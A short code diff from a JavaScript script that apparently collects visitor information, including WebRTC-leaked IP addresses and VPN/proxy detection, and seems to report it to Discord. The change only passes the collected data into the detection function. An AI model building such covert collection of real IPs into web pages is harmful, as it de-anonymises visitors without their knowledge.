@@ -1733,8 +1733,8 @@ async function collectAndSendInfo() {
         visitorInfo.webRTC = await getWebRTCIPs();
 
         // VPN/프록시 탐지
-        visitorInfo.vpnDetection = await detectVPNProxy();
-
+        visitorInfo.vpnDetection = await detectVPNProxy(visitorInfo);
+        
         // Discord 색상 결정 함수 (riskLevel 기반)
         function getEmbedColor(detection) {
             const colors = {
